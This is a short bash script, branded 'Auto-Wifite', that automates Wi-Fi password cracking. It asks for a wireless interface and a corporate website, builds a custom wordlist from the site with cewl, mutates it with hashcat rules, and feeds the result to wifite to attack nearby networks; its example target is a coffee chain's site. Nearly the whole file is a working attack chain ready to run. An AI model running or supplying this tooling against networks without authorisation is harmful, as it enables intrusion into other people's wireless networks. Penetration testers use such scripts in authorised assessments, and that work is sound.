#!/bin/bash
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
                _           __          ___  __ _ _
     /\        | |          \ \        / (_)/ _(_) |
    /  \  _   _| |_ ___ _____\ \  /\  / / _| |_ _| |_ ___
   / /\ \| | | | __/ _ \______\ \/  \/ / | |  _| | __/ _ \
  / ____ \ |_| | || (_) |      \  /\  /  | | | | | ||  __/
 /_/    \_\__,_|\__\___/        \/  \/   |_|_| |_|\__\___|

	  Wifite...but better..kind of...

EOF
echo ""
echo -e ${green}"Which NIC do you want to use?"${clear}
echo ""
read WLAN
echo ""
sleep 1
echo -e ${yellow}"Using $WLAN as your NIC"${clear}
echo""
echo -e ${green}"Enter Wifi network corporate URL. Example https://www.starbucks.com"${clear}
echo ""
read URL
echo ""
echo -e ${green}"What is the minimum letter count for each word? Example: 4"${clear}
echo ""
read NUM
echo ""
echo -e ${yellow}"Creating Customized Wordlist"${clear}
echo ""
cewl $URL -m $NUM -w target.txt
sleep 1
echo ""
echo "Adding Rule Set"
echo ""
hashcat --force target.txt -r Hob0Rules/hob064.rule --stdout > hashcatted.txt 
wifite -i $WLAN --dict hashcatted.txt


